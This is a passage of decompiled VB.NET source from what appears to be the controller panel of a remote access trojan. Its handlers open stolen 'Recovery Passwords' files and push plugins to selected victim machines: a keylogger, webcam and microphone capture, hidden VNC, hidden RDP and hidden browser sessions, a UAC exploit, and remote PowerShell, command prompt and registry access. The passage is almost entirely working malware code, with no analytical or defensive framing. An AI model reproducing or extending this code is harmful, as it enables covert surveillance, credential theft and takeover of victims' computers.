						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						Dim formPasswordView As FormPasswordView = CType(NewLateBinding.LateGet(Application.OpenForms, Nothing, "Item", New Object() { Operators.ConcatenateObject("Recovery Passwords", dataGridViewRow.Cells(1).Value) }, Nothing, Nothing, Nothing), FormPasswordView)
						Dim flag2 As Boolean = formPasswordView Is Nothing
						If flag2 Then
							formPasswordView = New FormPasswordView() With { .Name = Conversions.ToString(Operators.ConcatenateObject("Recovery Passwords", dataGridViewRow.Cells(1).Value)), .Text = "Recovery Passwords", .User = Conversions.ToString(dataGridViewRow.Cells(1).Value), .SystemOs = Conversions.ToString(dataGridViewRow.Cells(2).Value), .PasswordsPath = Conversions.ToString(Operators.ConcatenateObject(Application.StartupPath + "\Clients\Passwords\", Operators.AddObject(dataGridViewRow.Cells(1).Value, ".bin"))) }
							formPasswordView.Show()
						Else
							formPasswordView.WindowState = FormWindowState.Minimized
							formPasswordView.WindowState = FormWindowState.Normal
						End If
					Next
				Catch ex As Exception
				End Try
			End If
		End Sub

		' Token: 0x06000D85 RID: 3461 RVA: 0x00076E18 File Offset: 0x00075018
		Private Sub DeletePassword_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.ListPassword.Rows.Count > 0
			If flag Then
				Try
					For Each obj As Object In Me.ListPassword.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						Dim path As String = Conversions.ToString(Operators.ConcatenateObject(Application.StartupPath + "\Clients\Passwords\", Operators.AddObject(dataGridViewRow.Cells(1).Value, ".bin")))
						Dim flag2 As Boolean = File.Exists(path)
						If flag2 Then
							Try
								File.Delete(path)
							Catch ex As Exception
							End Try
						End If
						Me.ListPassword.Rows.Remove(dataGridViewRow)
					Next
				Catch ex2 As Exception
				End Try
			End If
		End Sub

		' Token: 0x06000D86 RID: 3462 RVA: 0x00076F14 File Offset: 0x00075114
		Private Sub FormS500_Resize(sender As Object, e As EventArgs)
			' The following expression was wrapped in a checked-statement
			Try
				Dim flag As Boolean = Not Me.ResizeBool
				If flag Then
					Dim width As Integer = Screen.PrimaryScreen.Bounds.Width
					Dim height As Integer = Screen.PrimaryScreen.Bounds.Height
					Dim width2 As Integer = MyBase.Width
					Dim height2 As Integer = MyBase.Height
					Dim x As Integer = CInt(Math.Round(CDbl((width - width2)) / 2.0))
					Dim y As Integer = CInt(Math.Round(CDbl((height - height2)) / 2.0))
					MyBase.Location = New Point(x, y)
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000D87 RID: 3463 RVA: 0x00076FCC File Offset: 0x000751CC
		Private Sub PageSettings_Click(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x06000D88 RID: 3464 RVA: 0x00076FCF File Offset: 0x000751CF
		Private Sub Panel6_Paint(sender As Object, e As PaintEventArgs)
		End Sub

		' Token: 0x06000D89 RID: 3465 RVA: 0x00076FD2 File Offset: 0x000751D2
		Private Sub TabPage4_Click(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x170005A8 RID: 1448
		' (get) Token: 0x06000D8A RID: 3466 RVA: 0x00076FD5 File Offset: 0x000751D5
		' (set) Token: 0x06000D8B RID: 3467 RVA: 0x00076FDF File Offset: 0x000751DF
		Private Property MoveForm As Boolean

		' Token: 0x170005A9 RID: 1449
		' (get) Token: 0x06000D8C RID: 3468 RVA: 0x00076FE8 File Offset: 0x000751E8
		' (set) Token: 0x06000D8D RID: 3469 RVA: 0x00076FF2 File Offset: 0x000751F2
		Private Property MoveForm_MousePosition As Point

		' Token: 0x06000D8E RID: 3470 RVA: 0x00076FFC File Offset: 0x000751FC
		Private Sub FormPanel_MouseUp(sender As Object, e As MouseEventArgs)
			Dim flag As Boolean = e.Button = MouseButtons.Left
			If flag Then
				Me.MoveForm = False
				Me.Cursor = Cursors.[Default]
			End If
		End Sub

		' Token: 0x06000D8F RID: 3471 RVA: 0x00077034 File Offset: 0x00075234
		Private Sub FormPanel_MouseDown(sender As Object, e As MouseEventArgs)
			Dim flag As Boolean = e.Button = MouseButtons.Left
			If flag Then
				Me.MoveForm = True
				Me.Cursor = Cursors.[Default]
				Me.MoveForm_MousePosition = e.Location
			End If
		End Sub

		' Token: 0x06000D90 RID: 3472 RVA: 0x00077078 File Offset: 0x00075278
		Private Sub FormPanel_MouseMove(sender As Object, e As MouseEventArgs)
			Dim moveForm As Boolean = Me.MoveForm
			If moveForm Then
				MyBase.Location += CType((e.Location - CType(Me.MoveForm_MousePosition, Size)), Size)
			End If
		End Sub

		' Token: 0x06000D91 RID: 3473 RVA: 0x000770C0 File Offset: 0x000752C0
		Private Sub FileManagerContexMune_Click(sender As Object, e As EventArgs)
			Try
				For Each clients As Clients In Me.GetSelectedClients()
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").SetAsString("GetPLG")
					msgPack.ForcePathObject("IDHash").SetAsString(GetHash.GetChecksum("Plugins\FileManager.dll"))
					msgPack.ForcePathObject("ID").SetAsString(clients.IpPort())
					msgPack.ForcePathObject("Chack").SetAsString(Conversions.ToString(True))
					Dim formFileManager As FormFileManager = CType(Application.OpenForms("FileManager" + clients.IpPort()), FormFileManager)
					Dim flag As Boolean = formFileManager Is Nothing
					If flag Then
						formFileManager = New FormFileManager() With { .Name = "FileManager" + clients.IpPort(), .F = Me, .Text = "File Manager", .ParentClient = clients }
						formFileManager.Show()
						ThreadPool.QueueUserWorkItem(AddressOf clients.SendByte, msgPack.Encode2Bytes())
					Else
						formFileManager.WindowState = FormWindowState.Minimized
						formFileManager.WindowState = FormWindowState.Normal
					End If
				Next
			Catch ex As Exception
				ListLogs.AddArray("File Manager Error : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x06000D92 RID: 3474 RVA: 0x00077240 File Offset: 0x00075440
		Private Sub StartupManagerContex_Click(sender As Object, e As EventArgs)
			Try
				For Each clients As Clients In Me.GetSelectedClients()
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").SetAsString("GetPLG")
					msgPack.ForcePathObject("IDHash").SetAsString(GetHash.GetChecksum("Plugins\Startup.dll"))
					msgPack.ForcePathObject("ID").SetAsString(clients.IpPort())
					msgPack.ForcePathObject("Chack").SetAsString(Conversions.ToString(True))
					Dim formStartup As FormStartup = CType(Application.OpenForms("FormStartup" + clients.IpPort()), FormStartup)
					Dim flag As Boolean = formStartup Is Nothing
					If flag Then
						formStartup = New FormStartup() With { .Name = "FormStartup" + clients.IpPort(), .F = Me, .Text = "Startup", .ParentClient = clients }
						formStartup.Show()
						ThreadPool.QueueUserWorkItem(AddressOf clients.SendByte, msgPack.Encode2Bytes())
					Else
						formStartup.WindowState = FormWindowState.Minimized
						formStartup.WindowState = FormWindowState.Normal
					End If
				Next
			Catch ex As Exception
				ListLogs.AddArray("Startup Error : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x06000D93 RID: 3475 RVA: 0x000773C0 File Offset: 0x000755C0
		Private Sub ProcessManagerContex_Click(sender As Object, e As EventArgs)
			Try
				For Each clients As Clients In Me.GetSelectedClients()
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").SetAsString("GetPLG")
					msgPack.ForcePathObject("IDHash").SetAsString(GetHash.GetChecksum("Plugins\TaskManager.dll"))
					msgPack.ForcePathObject("ID").SetAsString(clients.IpPort())
					msgPack.ForcePathObject("Chack").SetAsString(Conversions.ToString(True))
					Dim formTaskManager As FormTaskManager = CType(Application.OpenForms("FormTaskManager" + clients.IpPort()), FormTaskManager)
					Dim flag As Boolean = formTaskManager Is Nothing
					If flag Then
						formTaskManager = New FormTaskManager() With { .Name = "FormTaskManager" + clients.IpPort(), .F = Me, .Text = "Task Manager", .ParentClient = clients }
						formTaskManager.Show()
						ThreadPool.QueueUserWorkItem(AddressOf clients.SendByte, msgPack.Encode2Bytes())
					Else
						formTaskManager.WindowState = FormWindowState.Minimized
						formTaskManager.WindowState = FormWindowState.Normal
					End If
				Next
			Catch ex As Exception
				ListLogs.AddArray("Task Manager Error : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x06000D94 RID: 3476 RVA: 0x00077540 File Offset: 0x00075740
		Private Sub PowerShellContex_Click(sender As Object, e As EventArgs)
			Try
				For Each clients As Clients In Me.GetSelectedClients()
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").SetAsString("GetPLG")
					msgPack.ForcePathObject("IDHash").SetAsString(GetHash.GetChecksum("Plugins\Powershell.dll"))
					msgPack.ForcePathObject("ID").SetAsString(clients.IpPort())
					msgPack.ForcePathObject("Chack").SetAsString(Conversions.ToString(True))
					Dim formPowerShell As FormPowerShell = CType(Application.OpenForms("FrmPowerShell" + clients.IpPort()), FormPowerShell)
					Dim flag As Boolean = formPowerShell Is Nothing
					If flag Then
						formPowerShell = New FormPowerShell() With { .Name = "FrmPowerShell" + clients.IpPort(), .F = Me, .Text = "PowerShell", .ParentClient = clients }
						formPowerShell.Show()
						ThreadPool.QueueUserWorkItem(AddressOf clients.SendByte, msgPack.Encode2Bytes())
					Else
						formPowerShell.WindowState = FormWindowState.Minimized
						formPowerShell.WindowState = FormWindowState.Normal
					End If
				Next
			Catch ex As Exception
				ListLogs.AddArray("Powershell Error : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x06000D95 RID: 3477 RVA: 0x000776C0 File Offset: 0x000758C0
		Private Sub RegistryContex_Click(sender As Object, e As EventArgs)
			Try
				For Each clients As Clients In Me.GetSelectedClients()
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").SetAsString("GetPLG")
					msgPack.ForcePathObject("IDHash").SetAsString(GetHash.GetChecksum("Plugins\RegistryEditor.dll"))
					msgPack.ForcePathObject("ID").SetAsString(clients.IpPort())
					msgPack.ForcePathObject("Chack").SetAsString(Conversions.ToString(True))
					Dim formRegistryE As FormRegistryE = CType(Application.OpenForms("FrmRegistryEditor" + clients.IpPort()), FormRegistryE)
					Dim flag As Boolean = formRegistryE Is Nothing
					If flag Then
						formRegistryE = New FormRegistryE() With { .Name = "FrmRegistryEditor" + clients.IpPort(), .F = Me, .Text = "Registry Editor", .ParentClient = clients }
						formRegistryE.Show()
						ThreadPool.QueueUserWorkItem(AddressOf clients.SendByte, msgPack.Encode2Bytes())
					Else
						formRegistryE.WindowState = FormWindowState.Minimized
						formRegistryE.WindowState = FormWindowState.Normal
					End If
				Next
			Catch ex As Exception
				ListLogs.AddArray("Registry Editor Error : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x06000D96 RID: 3478 RVA: 0x00077840 File Offset: 0x00075A40
		Private Sub CmdContex_Click(sender As Object, e As EventArgs)
			Try
				For Each clients As Clients In Me.GetSelectedClients()
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").SetAsString("GetPLG")
					msgPack.ForcePathObject("IDHash").SetAsString(GetHash.GetChecksum("Plugins\Cmd.dll"))
					msgPack.ForcePathObject("ID").SetAsString(clients.IpPort())
					msgPack.ForcePathObject("Chack").SetAsString(Conversions.ToString(True))
					Dim formCMD As FormCMD = CType(Application.OpenForms("FrmCMD" + clients.IpPort()), FormCMD)
					Dim flag As Boolean = formCMD Is Nothing
					If flag Then
						formCMD = New FormCMD() With { .Name = "FrmCMD" + clients.IpPort(), .F = Me, .Text = "Command Prompt", .ParentClient = clients }
						formCMD.Show()
						ThreadPool.QueueUserWorkItem(AddressOf clients.SendByte, msgPack.Encode2Bytes())
					Else
						formCMD.WindowState = FormWindowState.Minimized
						formCMD.WindowState = FormWindowState.Normal
					End If
				Next
			Catch ex As Exception
				ListLogs.AddArray("Registry Editor Error : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x06000D97 RID: 3479 RVA: 0x000779C0 File Offset: 0x00075BC0
		Private Sub ServicesContex_Click(sender As Object, e As EventArgs)
			Try
				For Each clients As Clients In Me.GetSelectedClients()
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").SetAsString("GetPLG")
					msgPack.ForcePathObject("IDHash").SetAsString(GetHash.GetChecksum("Plugins\Services.dll"))
					msgPack.ForcePathObject("ID").SetAsString(clients.IpPort())
					msgPack.ForcePathObject("Chack").SetAsString(Conversions.ToString(True))
					Dim formServices As FormServices = CType(Application.OpenForms("FormServices" + clients.IpPort()), FormServices)
					Dim flag As Boolean = formServices Is Nothing
					If flag Then
						formServices = New FormServices() With { .Name = "FormServices" + clients.IpPort(), .F = Me, .Text = "Services", .ParentClient = clients }
						formServices.Show()
						ThreadPool.QueueUserWorkItem(AddressOf clients.SendByte, msgPack.Encode2Bytes())
					Else
						formServices.WindowState = FormWindowState.Minimized
						formServices.WindowState = FormWindowState.Normal
					End If
				Next
			Catch ex As Exception
				ListLogs.AddArray("Services Error : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x06000D98 RID: 3480 RVA: 0x00077B40 File Offset: 0x00075D40
		Private Sub InstalledSoftWareContex_Click(sender As Object, e As EventArgs)
			Try
				For Each clients As Clients In Me.GetSelectedClients()
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").SetAsString("GetPLG")
					msgPack.ForcePathObject("IDHash").SetAsString(GetHash.GetChecksum("Plugins\Installedsoftwares.dll"))
					msgPack.ForcePathObject("ID").SetAsString(clients.IpPort())
					msgPack.ForcePathObject("Chack").SetAsString(Conversions.ToString(True))
					Dim formInstalledSoftware As FormInstalledSoftware = CType(Application.OpenForms("FormInstalledSoftware" + clients.IpPort()), FormInstalledSoftware)
					Dim flag As Boolean = formInstalledSoftware Is Nothing
					If flag Then
						formInstalledSoftware = New FormInstalledSoftware() With { .Name = "FormInstalledSoftware" + clients.IpPort(), .F = Me, .Text = "Inmstalled Software", .ParentClient = clients }
						formInstalledSoftware.Show()
						ThreadPool.QueueUserWorkItem(AddressOf clients.SendByte, msgPack.Encode2Bytes())
					Else
						formInstalledSoftware.WindowState = FormWindowState.Minimized
						formInstalledSoftware.WindowState = FormWindowState.Normal
					End If
				Next
			Catch ex As Exception
				ListLogs.AddArray("Inmstalled Software Error : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x06000D99 RID: 3481 RVA: 0x00077CC0 File Offset: 0x00075EC0
		Private Sub InformationsContex_Click(sender As Object, e As EventArgs)
			Try
				For Each clients As Clients In Me.GetSelectedClients()
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").SetAsString("GetPLG")
					msgPack.ForcePathObject("IDHash").SetAsString(GetHash.GetChecksum("Plugins\Information.dll"))
					msgPack.ForcePathObject("ID").SetAsString(clients.IpPort())
					msgPack.ForcePathObject("Chack").SetAsString(Conversions.ToString(True))
					Dim formInformation As FormInformation = CType(Application.OpenForms("FormStartup" + clients.IpPort()), FormInformation)
					Dim flag As Boolean = formInformation Is Nothing
					If flag Then
						formInformation = New FormInformation() With { .Name = "FormInformation" + clients.IpPort(), .F = Me, .Text = "Information", .ParentClient = clients }
						formInformation.Show()
						ThreadPool.QueueUserWorkItem(AddressOf clients.SendByte, msgPack.Encode2Bytes())
					Else
						formInformation.WindowState = FormWindowState.Minimized
						formInformation.WindowState = FormWindowState.Normal
					End If
				Next
			Catch ex As Exception
				ListLogs.AddArray("Information Error : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x06000D9A RID: 3482 RVA: 0x00077E40 File Offset: 0x00076040
		Private Sub SendFileContex_Click(sender As Object, e As EventArgs)
			Try
				For Each clients As Clients In Me.GetSelectedClients()
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").SetAsString("GetPLG")
					msgPack.ForcePathObject("IDHash").SetAsString(GetHash.GetChecksum("Plugins\SendFile.dll"))
					msgPack.ForcePathObject("ID").SetAsString(clients.IpPort())
					msgPack.ForcePathObject("Chack").SetAsString(Conversions.ToString(True))
					Dim formSendFile As FormSendFile = CType(Application.OpenForms("FormSendFile" + clients.IpPort()), FormSendFile)
					Dim flag As Boolean = formSendFile Is Nothing
					If flag Then
						formSendFile = New FormSendFile() With { .Name = "FormSendFile" + clients.IpPort(), .F = Me, .Text = "Send File", .ParentClient = clients }
						formSendFile.Show()
						ThreadPool.QueueUserWorkItem(AddressOf clients.SendByte, msgPack.Encode2Bytes())
					Else
						formSendFile.WindowState = FormWindowState.Minimized
						formSendFile.WindowState = FormWindowState.Normal
					End If
				Next
			Catch ex As Exception
				ListLogs.AddArray("Send File Error : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x06000D9B RID: 3483 RVA: 0x00077FC0 File Offset: 0x000761C0
		Private Sub RemoteDesktopContex_Click(sender As Object, e As EventArgs)
			Try
				For Each clients As Clients In Me.GetSelectedClients()
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").SetAsString("GetPLG")
					msgPack.ForcePathObject("IDHash").SetAsString(GetHash.GetChecksum("Plugins\RemoteDesktop.dll"))
					msgPack.ForcePathObject("ID").SetAsString(clients.IpPort())
					msgPack.ForcePathObject("Chack").SetAsString(Conversions.ToString(True))
					Dim formRemoteDesktop As FormRemoteDesktop = CType(Application.OpenForms("FormRemoteDesktop" + clients.IpPort()), FormRemoteDesktop)
					Dim flag As Boolean = formRemoteDesktop Is Nothing
					If flag Then
						formRemoteDesktop = New FormRemoteDesktop() With { .Name = "FormRemoteDesktop" + clients.IpPort(), .F = Me, .Text = "Remote Desktop", .ParentClient = clients }
						formRemoteDesktop.Show()
						ThreadPool.QueueUserWorkItem(AddressOf clients.SendByte, msgPack.Encode2Bytes())
					Else
						formRemoteDesktop.WindowState = FormWindowState.Minimized
						formRemoteDesktop.WindowState = FormWindowState.Normal
					End If
				Next
			Catch ex As Exception
				ListLogs.AddArray("Remote Desktop Error : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x06000D9C RID: 3484 RVA: 0x00078140 File Offset: 0x00076340
		Private Sub ActiveWindowsContex_Click(sender As Object, e As EventArgs)
			Try
				For Each clients As Clients In Me.GetSelectedClients()
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").SetAsString("GetPLG")
					msgPack.ForcePathObject("IDHash").SetAsString(GetHash.GetChecksum("Plugins\ActiveWindows.dll"))
					msgPack.ForcePathObject("ID").SetAsString(clients.IpPort())
					msgPack.ForcePathObject("Chack").SetAsString(Conversions.ToString(True))
					Dim formWindowsActive As FormWindowsActive = CType(Application.OpenForms("FormActiveWindows" + clients.IpPort()), FormWindowsActive)
					Dim flag As Boolean = formWindowsActive Is Nothing
					If flag Then
						formWindowsActive = New FormWindowsActive() With { .Name = "FormActiveWindows" + clients.IpPort(), .F = Me, .Text = "Active Windows", .ParentClient = clients }
						formWindowsActive.Show()
						ThreadPool.QueueUserWorkItem(AddressOf clients.SendByte, msgPack.Encode2Bytes())
					Else
						formWindowsActive.WindowState = FormWindowState.Minimized
						formWindowsActive.WindowState = FormWindowState.Normal
					End If
				Next
			Catch ex As Exception
				ListLogs.AddArray("Active Windows Error : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x06000D9D RID: 3485 RVA: 0x000782C0 File Offset: 0x000764C0
		Private Sub RemoteCamaraContex_Click(sender As Object, e As EventArgs)
			Try
				For Each clients As Clients In Me.GetSelectedClients()
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").SetAsString("GetPLG")
					msgPack.ForcePathObject("IDHash").SetAsString(GetHash.GetChecksum("Plugins\RemoteCamera.dll"))
					msgPack.ForcePathObject("ID").SetAsString(clients.IpPort())
					msgPack.ForcePathObject("Chack").SetAsString(Conversions.ToString(True))
					Dim formCamera As FormCamera = CType(Application.OpenForms("FormCamera" + clients.IpPort()), FormCamera)
					Dim flag As Boolean = formCamera Is Nothing
					If flag Then
						formCamera = New FormCamera() With { .Name = "FormCamera" + clients.IpPort(), .F = Me, .Text = "Camera", .ParentClient = clients }
						formCamera.Show()
						ThreadPool.QueueUserWorkItem(AddressOf clients.SendByte, msgPack.Encode2Bytes())
					Else
						formCamera.WindowState = FormWindowState.Minimized
						formCamera.WindowState = FormWindowState.Normal
					End If
				Next
			Catch ex As Exception
				ListLogs.AddArray("Camera Error : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x06000D9E RID: 3486 RVA: 0x00078440 File Offset: 0x00076640
		Private Sub MonitorWatcherContex_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.L1.SelectedRows.Count <> 0
			If flag Then
				Dim reportWindows As ReportWindows = New ReportWindows()
				reportWindows.ShowDialog(Me)
				Dim flag2 As Boolean = reportWindows.Title.Length > 0
				If flag2 Then
					Try
						For Each [object] As Clients In Me.GetSelectedClients()
							Dim msgPack As MsgPack = New MsgPack()
							msgPack.ForcePathObject("Packet").SetAsString("Repot")
							msgPack.ForcePathObject("Value").SetAsString(reportWindows.Title)
							ThreadPool.QueueUserWorkItem(AddressOf [object].SendByte, msgPack.Encode2Bytes())
						Next
					Catch ex As Exception
						ListLogs.AddArray("Motionr Watcher Error : " + ex.Message, 0)
					End Try
				End If
			End If
		End Sub

		' Token: 0x06000D9F RID: 3487 RVA: 0x00078544 File Offset: 0x00076744
		Private Sub KeyloggerContex_Click(sender As Object, e As EventArgs)
			Try
				For Each clients As Clients In Me.GetSelectedClients()
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").SetAsString("GetPLG")
					msgPack.ForcePathObject("IDHash").SetAsString(GetHash.GetChecksum("Plugins\Keylogger.dll"))
					msgPack.ForcePathObject("ID").SetAsString(clients.IpPort())
					msgPack.ForcePathObject("Chack").SetAsString(Conversions.ToString(True))
					Dim formKeylogger As FormKeylogger = CType(Application.OpenForms("FormKeylogger" + clients.IpPort()), FormKeylogger)
					Dim flag As Boolean = formKeylogger Is Nothing
					If flag Then
						formKeylogger = New FormKeylogger() With { .Name = "FormKeylogger" + clients.IpPort(), .F = Me, .Text = "Keylogger", .ParentClient = clients }
						formKeylogger.Show()
						ThreadPool.QueueUserWorkItem(AddressOf clients.SendByte, msgPack.Encode2Bytes())
					Else
						formKeylogger.WindowState = FormWindowState.Minimized
						formKeylogger.WindowState = FormWindowState.Normal
					End If
				Next
			Catch ex As Exception
				ListLogs.AddArray("Keylogger Error : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x06000DA0 RID: 3488 RVA: 0x000786C4 File Offset: 0x000768C4
		Private Sub UACExploitContex_Click(sender As Object, e As EventArgs)
			Try
				For Each clients As Clients In Me.GetSelectedClients()
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").SetAsString("GetPLG")
					msgPack.ForcePathObject("IDHash").SetAsString(GetHash.GetChecksum("Plugins\Admin.dll"))
					msgPack.ForcePathObject("ID").SetAsString(clients.IpPort())
					msgPack.ForcePathObject("Chack").SetAsString(Conversions.ToString(True))
					Dim formAdmin As FormAdmin = CType(Application.OpenForms("FormAdmin" + clients.IpPort()), FormAdmin)
					Dim flag As Boolean = formAdmin Is Nothing
					If flag Then
						formAdmin = New FormAdmin() With { .Name = "FormAdmin" + clients.IpPort(), .F = Me, .Text = "UAC Exploit", .ParentClient = clients }
						formAdmin.Show()
						ThreadPool.QueueUserWorkItem(AddressOf clients.SendByte, msgPack.Encode2Bytes())
					Else
						formAdmin.WindowState = FormWindowState.Minimized
						formAdmin.WindowState = FormWindowState.Normal
					End If
				Next
			Catch ex As Exception
				ListLogs.AddArray("UAC Exploit Error : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x06000DA1 RID: 3489 RVA: 0x00078844 File Offset: 0x00076A44
		Private Sub MicrophoneContex_Click(sender As Object, e As EventArgs)
			Try
				For Each clients As Clients In Me.GetSelectedClients()
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").SetAsString("GetPLG")
					msgPack.ForcePathObject("IDHash").SetAsString(GetHash.GetChecksum("Plugins\Mic.dll"))
					msgPack.ForcePathObject("ID").SetAsString(clients.IpPort())
					msgPack.ForcePathObject("Chack").SetAsString(Conversions.ToString(True))
					Dim microphone As Microphone = CType(Application.OpenForms("Microphone" + clients.IpPort()), Microphone)
					Dim flag As Boolean = microphone Is Nothing
					If flag Then
						microphone = New Microphone() With { .Name = "Microphone" + clients.IpPort(), .F = Me, .Text = "Microphone", .ParentClient = clients }
						microphone.Show()
						ThreadPool.QueueUserWorkItem(AddressOf clients.SendByte, msgPack.Encode2Bytes())
					Else
						microphone.WindowState = FormWindowState.Minimized
						microphone.WindowState = FormWindowState.Normal
					End If
				Next
			Catch ex As Exception
				ListLogs.AddArray("Microphone Error : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x06000DA2 RID: 3490 RVA: 0x000789C4 File Offset: 0x00076BC4
		Private Sub HiddenAppliactionsContex_Click(sender As Object, e As EventArgs)
			Try
				For Each clients As Clients In Me.GetSelectedClients()
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").SetAsString("GetPLG")
					msgPack.ForcePathObject("IDHash").SetAsString(GetHash.GetChecksum("Plugins\HiddenApps.dll"))
					msgPack.ForcePathObject("ID").SetAsString(clients.IpPort())
					msgPack.ForcePathObject("Chack").SetAsString(Conversions.ToString(True))
					Dim formHiddenProgram As FormHiddenProgram = CType(Application.OpenForms("FormHiddenProgram" + clients.IpPort()), FormHiddenProgram)
					Dim flag As Boolean = formHiddenProgram Is Nothing
					If flag Then
						formHiddenProgram = New FormHiddenProgram() With { .Name = "FormHiddenProgram" + clients.IpPort(), .F = Me, .Text = "Hidden Program", .ParentClient = clients }
						formHiddenProgram.Show()
						ThreadPool.QueueUserWorkItem(AddressOf clients.SendByte, msgPack.Encode2Bytes())
					Else
						formHiddenProgram.WindowState = FormWindowState.Minimized
						formHiddenProgram.WindowState = FormWindowState.Normal
					End If
				Next
			Catch ex As Exception
				ListLogs.AddArray("Hidden Applactions Error : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x06000DA3 RID: 3491 RVA: 0x00078B44 File Offset: 0x00076D44
		Private Sub HiddenBrowserContex_Click(sender As Object, e As EventArgs)
			Try
				For Each clients As Clients In Me.GetSelectedClients()
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").SetAsString("GetPLG")
					msgPack.ForcePathObject("IDHash").SetAsString(GetHash.GetChecksum("Plugins\HBrowser.dll"))
					msgPack.ForcePathObject("ID").SetAsString(clients.IpPort())
					msgPack.ForcePathObject("Chack").SetAsString(Conversions.ToString(True))
					Dim formHBrowser As FormHBrowser = CType(Application.OpenForms("FormHBrowser" + clients.IpPort()), FormHBrowser)
					Dim flag As Boolean = formHBrowser Is Nothing
					If flag Then
						formHBrowser = New FormHBrowser() With { .Name = "FormHBrowser" + clients.IpPort(), .F = Me, .Text = "Hidden Browser", .ParentClient = clients }
						formHBrowser.Show()
						ThreadPool.QueueUserWorkItem(AddressOf clients.SendByte, msgPack.Encode2Bytes())
					Else
						formHBrowser.WindowState = FormWindowState.Minimized
						formHBrowser.WindowState = FormWindowState.Normal
					End If
				Next
			Catch ex As Exception
				ListLogs.AddArray("Hidden Browser Error : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x06000DA4 RID: 3492 RVA: 0x00078CC4 File Offset: 0x00076EC4
		Private Sub HiddenVNCContex_Click(sender As Object, e As EventArgs)
			Try
				For Each clients As Clients In Me.GetSelectedClients()
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").SetAsString("GetPLG")
					msgPack.ForcePathObject("IDHash").SetAsString(GetHash.GetChecksum("Plugins\HVNC.dll"))
					msgPack.ForcePathObject("ID").SetAsString(clients.IpPort())
					msgPack.ForcePathObject("Chack").SetAsString(Conversions.ToString(True))
					Dim formHVNC As FormHVNC = CType(Application.OpenForms("FormHVNC" + clients.IpPort()), FormHVNC)
					Dim flag As Boolean = formHVNC Is Nothing
					If flag Then
						formHVNC = New FormHVNC() With { .Name = "FormHVNC" + clients.IpPort(), .F = Me, .Text = "HVNC", .ParentClient = clients }
						formHVNC.Show()
						ThreadPool.QueueUserWorkItem(AddressOf clients.SendByte, msgPack.Encode2Bytes())
					Else
						formHVNC.WindowState = FormWindowState.Minimized
						formHVNC.WindowState = FormWindowState.Normal
					End If
				Next
			Catch ex As Exception
				ListLogs.AddArray("Hidden VNC Error : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x06000DA5 RID: 3493 RVA: 0x00078E44 File Offset: 0x00077044
		Private Sub HiddenRDPContex_Click(sender As Object, e As EventArgs)
			Try
				For Each clients As Clients In Me.GetSelectedClients()
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").SetAsString("GetPLG")
					msgPack.ForcePathObject("IDHash").SetAsString(GetHash.GetChecksum("Plugins\HRDP.dll"))
					msgPack.ForcePathObject("ID").SetAsString(clients.IpPort())
					msgPack.ForcePathObject("Chack").SetAsString(Conversions.ToString(True))
					Dim formHRDP As FormHRDP = CType(Application.OpenForms("FormHRDP" + clients.IpPort()), FormHRDP)
					Dim flag As Boolean = formHRDP Is Nothing
					If flag Then
						formHRDP = New FormHRDP() With { .Name = "FormHRDP" + clients.IpPort(), .F = Me, .Text = "Hidden RDP", .ParentClient = clients }
						formHRDP.Show()
						ThreadPool.QueueUserWorkItem(AddressOf clients.SendByte, msgPack.Encode2Bytes())
					Else
						formHRDP.WindowState = FormWindowState.Minimized
						formHRDP.WindowState = FormWindowState.Normal
					End If
				Next
			Catch ex As Exception
				ListLogs.AddArray("Hidden RDP Error : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x06000DA6 RID: 3494 RVA: 0x00078FC4 File Offset: 0x000771C4
